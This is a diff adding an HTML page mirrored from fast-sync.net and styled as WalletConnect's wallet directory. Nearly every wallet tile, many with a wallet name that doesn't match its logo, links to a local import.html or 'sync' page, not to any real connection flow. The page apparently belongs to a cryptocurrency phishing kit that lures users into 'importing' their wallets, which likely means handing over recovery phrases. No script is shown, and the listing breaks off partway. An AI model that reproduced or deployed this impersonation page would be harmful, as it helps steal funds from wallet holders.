@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html>
+
+<!-- Mirrored from fast-sync.net/wallet/wallet.html by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 16 Oct 2021 14:36:54 GMT -->
+<head>
+    <meta name="viewport" content="width=device-width">
+    <meta charset="utf-8">
+    <title>WalletConnect</title>
+    <link rel="shortcut icon" href="favicon.ico">
+    <meta name="msapplication-TileColor" content="#da532c">
+    <meta name="theme-color" content="#ffffff">
+    <meta name="description" content="Open protocol for connecting Wallets to Dapps">
+    <meta name="keywords" content="ethereum, cryptocurrency, wallet, mobile, connect, bridge, relay, proxy, standard, protocol, crypto, tokens, dapp">
+    <meta name="next-head-count" content="20">
+    <link rel="preload" href="styles/bb1b173fc1f7ba0b36c3.css" as="style">
+    <link rel="stylesheet" href="styles/bb1b173fc1f7ba0b36c3.css" data-n-g="">
+    <noscript data-n-css=""></noscript>
+    
+</head>
+<body>
+    <div id="__next">
+        <div class="font-roboto" id="content">
+            <header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
+                <div class="absolute inset-0 shadow-lg opacity-50"></div>
+                <div class="z-20 flex justify-around w-full sm:pr-10 md:pr-20">
+                    <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank" href="#" rel="noopener noreferrer">
+                        <!-- -->
+                        GitHub<!-- -->
+                    </a>
+                    <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" target="_blank" href="#" rel="noopener noreferrer">
+                        <!-- -->
+                        Docs<!-- -->
+                    </a>
+                </div>
+                <div class="z-20 flex">
+                    <div class="w-16 mx-6 sm:w-20 md:w-28">
+                        <a href="index-2.html"><img class="cursor-pointer object-fit" src="walletconnect-logo.svg" alt="walletconnect logo"></a>
+                    </div>
+                </div>
+                <div class="z-20 flex justify-around w-full sm:pl-10 md:pl-20">
+                    <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" href="wallet.html">
+                        <!-- -->
+                        Wallets<!-- -->
+                    </a>
+                    <a class="font-semibold text-cool-gray-500 hover:text-cool-gray-600 sm:text-xl" href="apps.html">
+                        <!-- -->
+                        Apps<!-- -->
+                    </a>
+                </div>
+            </header>
+            
+<main class="flex flex-col mx-8 mt-12 space-y-10 text-center align-middle">
+                <div class="flex justify-center">
+                    <div class="max-w-3xl">
+						<a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+
+                        <h1 class="text-4xl font-medium text-cool-gray-500">Wallets</h1>
+                        <p class="mt-10 text-lg font-thin leading-6 text-gray-700">Multiple iOS and Android wallets support the WalletConnect protocol. Simply scan a QR code from your desktop computer screen to start securely using a dApp with your mobile wallet. Interaction between mobile apps and mobile browsers are supported via mobile deep linking.</p>
+						<div class="mt-2"></div>
+						</a>
+                    </div>
+                </div>
+                <div class="flex justify-center">
+                    <div class="grid max-w-3xl grid-cols-2 gap-10 mt-6 sm:grid-cols-3 md:grid-cols-4">
+						<a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.jpg" alt="Rainbow">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">SafePal</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpg" alt="Trust Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Trust Wallet</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpg" alt="Argent">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Ledger</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpg" alt="MetaMask">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">MetaMask</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/a5cfbd9a263c9dcfb59d6e9dc00933c46f00277ed78a6a0a1e38b0c17e09671f.jpg" alt="Gnosis Safe Multisig">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Phantom</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpg" alt="Crypto.com | DeFi Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Crypto.com | DeFi Wallet</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c.jpg" alt="Pillar">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Avax Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2.jpg" alt="imToken">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">imToken</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html"></a>
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpg" alt="ONTO">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Binance</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpg" alt="TokenPocket">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">TokenPocket</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpg" alt="MathWallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">MathWallet</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b.jpg" alt="BitPay">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">BitPay</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/4ab2542c2799c825a8465ba5ab8aa7def52b7904f38b74484af917ed9c0fc4e5.jpg" alt="Ledger Live">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Terra Station</div>
+                            </div>
+                        </a>
+                        
+						<a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="images/trezor.png" alt="Trezor Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Trezor Wallet</div>
+                            </div>
+                        </a>
+                        
+                        
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/83f26999937cbc2e2014655796da4b05f77c1de9413a0ee6d0c6178ebcfc3168.jpg" alt="Walleth">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Coinbase</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/71dad538ba02a9b321041d388f9c1efe14e0d1915a2ea80a90405d2f6b67a33d.jpg" alt="Authereum">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">TRON Wallet</div>
+                            </div>
+                        </a>
+						<a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/09102e7bbbd3f92001eda104abe23803181629f695e8f1b95af96d88ff7d5890.jpg" alt="1inch Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">1inch Wallet</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/bae74827272509a6d63ea25514d9c68ad235c14e45e183518c7ded4572a1b0c4.jpg" alt="Huobi Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">BSCPAD</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61.jpg" alt="Eidoo">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Solfare</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e.jpg" alt="MYKEY">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Fantom</div>
+                            </div>
+                        </a>
+                        <a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/dcf291a025ead3e94ef694fa75617568daf76bf1e525bb240ecf5bf1add53756.jpg" alt="Loopring Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Wallet Connect</div>
+                            </div>
+                        </a>
+						<a target="_blank" rel="noreferrer" routerlink="./import.html" href="./import.html">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/6bb4596640ce9f8c02fbaa83e3685425455a0917d025608b4abc53bfe55887c6.jpg" alt="TrustVault">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:te  xt-blue-700">Sollet Wallet</div>
+                            </div>
+                        </a>
+                        <a target="_blank" href="sync-2636f6.html?wallet=atomicwallet.io" rel="noopener noreferrer">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/185850e869e40f4e6c59b5b3f60b7e63a72e88b09e2a43a40b1fd0f237e49e9a.jpg" alt="Atomic">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Atomic</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e.jpg" alt="Coin98">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Coin98</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/1f69170bf7a9bdcf89403ec012659b7124e158f925cdd4a2be49274c24cf5e5d.jpg" alt="CoolWallet S">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Moonlet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/beea4e71c2ffbb48b59b21e33fb0049ef6522585aa9c8a33a97d3e1c81f16693.jpg" alt="Alice">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Bitkeep</div>
+                            </div>
+                        </a>
+                        <a target="_blank" href="sync-3051b4.html?wallet=alphawallet.com" rel="noopener noreferrer">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpg" alt="Alpha Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">EXODUS</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63.jpg" alt="D&#x27;CENT Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">D&#x27;CENT Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09.jpg" alt="ZelCore">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">ZelCore</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/8605171a052e85d629c5efe5db804c7a3fb6d0ecc759d6817f0a18cb3dacbb14.jpg" alt="Nash">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Nash</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/9277bc510b6d95f29be38e7c0e402ae8438262f0f4c6dbb40dfc22f5043e8814.jpg" alt="Coinomi">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Coinomi</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/6ec1ffc9627c3b9f87676da3f7b5796828a6c016d3253e51e771e6f951cb5702.jpg" alt="GridPlus">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">GridPlus</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5.jpg" alt="CYBAVO Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">CYBAVO Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/c889f5add667a8c69d147d613c7f18a4bd97c2e47c946cabfdd13ec1d596e4a0.jpg" alt="Tokenary">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Tokenary</div>
+                            </div>
+                        </a>
+                        <a>
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/3f1bc4a8fd72b3665459ec5c99ee51b424f6beeebe46b45f4a70cf08a84cbc50.jpg" alt="Torus">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Torus</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/7b83869f03dc3848866e0299bc630aaf3213bea95cd6cecfbe149389cf457a09.jpg" alt="Spatium">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Spatium</div>
+                            </div>
+                        </a>
+                        <a target="_blank" href="sync-40a262.html?wallet=safepal.io" rel="noopener noreferrer">
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpg" alt="SafePal">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">MEW</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/d0387325e894a1c4244820260ad7c78bb20d79eeec2fd59ffe3529223f3f84c6.jpg" alt="Infinito">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Infinito</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/176b83d9268d77438e32aa44770fb37b40d6448740b6a05a97b175323356bd1b.jpg" alt="wallet.io">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">wallet.io</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/802a2041afdaf4c7e41a2903e98df333c8835897532699ad370f829390c6900f.jpg" alt="Infinity Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Infinity Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/8fb830a15679a8537d84c3852e026a4bdb39d0ee3b387411a91e8f6abafdc1ad.jpg" alt="Ownbit">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Ownbit</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c.jpg" alt="EasyPocket">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">EasyPocket</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/881946407ff22a32ec0e42b2cd31ea5dab52242dc3648d777b511a0440d59efb.jpg" alt="Bridge Wallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Bridge Wallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1.jpg" alt="SparkPoint">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">SparkPoint</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/ca86f48760bf5f84dcd6b1daca0fd55e2aa073ecf46453ba8a1db0b2e8e85ac1.jpg" alt="ViaWallet">
+                                    </div>
+                                </div>
+                                <div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">ViaWallet</div>
+                            </div>
+                        </a>
+                        <a >
+                            <div class="flex flex-col group">
+                                <div class="flex justify-center">
+                                    <div class="w-20 p-0 transition duration-300 ease-in-out rounded-full group-hover:shadow-lg md:w-32 sm:w-24">
+                                        <img class="inline-block w-20 rounded-full md:w-32 sm:w-24" src="logo/lg/42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106.jpg" alt="BitKeep">
+                                    </div>
+                                </div>
